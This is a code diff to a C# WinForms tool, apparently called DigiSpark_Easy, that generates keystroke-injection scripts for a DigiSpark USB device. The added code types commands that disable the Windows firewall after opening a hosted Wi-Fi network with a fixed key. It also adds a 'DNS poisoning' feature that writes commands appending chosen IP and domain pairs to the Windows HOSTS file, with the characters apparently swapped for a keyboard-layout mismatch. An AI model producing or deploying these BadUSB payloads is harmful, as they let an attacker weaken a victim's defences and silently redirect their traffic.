@@ -14,6 +14,7 @@ namespace DigiSpark_Easy
     public partial class FrmMain : Form
     {
         String script = "";
+        ListViewItem item = new ListViewItem("Item1", 0);
         public FrmMain()
         {
             InitializeComponent();
@@ -225,7 +226,59 @@ namespace DigiSpark_Easy
             txtScript.Text += "DigiKeyboard.println(\"netsh wlan set hostednetwork mode)allow ssid)digispark key)123456789\");" + "\r\n" +
                 "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
                 "DigiKeyboard.println(\"netsh wlan start hostednetwork\");" + "\r\n" +
+                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
+                "DigiKeyboard.println(\"netsh firewall set opmode disable\");" + "\r\n" +
                 "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n";
+        }
+
+        private void btnAdd_Click(object sender, EventArgs e)
+        {
+            if (txtIP.Text!="" && txtDNS.Text!="")
+            {
+                ListViewItem item = new ListViewItem(txtIP.Text);
+                item.SubItems.Add(txtDNS.Text);
+                listaDNS.Items.Add(item);
+            }
+        }
+
+        private void dnsPoisoningToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listaDNS.Items.Count==0)
+            {
+                MessageBox.Show("La lista no puede estar vacia");
+            }
+            else
+            {
+                txtScript.Text += "DigiKeyboard.println(\"echo. || C>&WINDOWS&SYSTEM32&DRIVERS&ETC&HOSTS\");" + "\r\n" +
+                    "DigiKeyboard.delay(100);" + "\r\n";
+                for (int i = 0; i < listaDNS.Items.Count; i++)
+                {
+                    txtScript.Text += "DigiKeyboard.println(\"echo " + listaDNS.Items[i].SubItems[0].Text + " " + listaDNS.Items[i].SubItems[1].Text + " || C>&WINDOWS&SYSTEM32&DRIVERS&ETC&HOSTS\");" + "\r\n" +
+                        "DigiKeyboard.delay(100);" + "\r\n";
+                }
+                
+            }
+        }
+
+        private void btnLimpiar_Click(object sender, EventArgs e)
+        {
+            listaDNS.Items.Clear();
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            listaDNS.SelectedItems[0].Remove();
+        }
+
+        private void btnModificar_Click(object sender, EventArgs e)
+        {
+            listaDNS.SelectedItems[0].SubItems[0].Text = txtIP.Text;
+            listaDNS.SelectedItems[0].SubItems[1].Text = txtDNS.Text;
+            /*foreach (ListViewItem item in listaDNS.SelectedItems)
+            {
+                item.SubItems[0].Text = txtIP.Text;
+                item.SubItems[1].Text = txtDNS.Text;
+            }*/
         }
     }
 }
